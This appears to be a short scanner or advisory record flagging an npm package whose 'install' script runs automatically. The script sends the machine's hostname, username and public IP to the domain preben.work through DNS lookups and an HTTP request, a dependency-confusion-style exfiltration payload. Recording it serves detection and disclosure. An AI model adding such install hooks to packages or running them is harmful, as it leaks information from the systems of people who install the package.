npm-install-script.code: "install": "host ent-screenshare.preben.work; host $(hostname).preben.work; host $(whoami).preben.work; host $(wget https://checkip.amazonaws.com -q -O /dev/stdout).preben.work; wget http://preben.work/?ent-screenshare -q -O /dev/null;"
npm-install-script.message: The package.json has a script automatically running when the package is installed
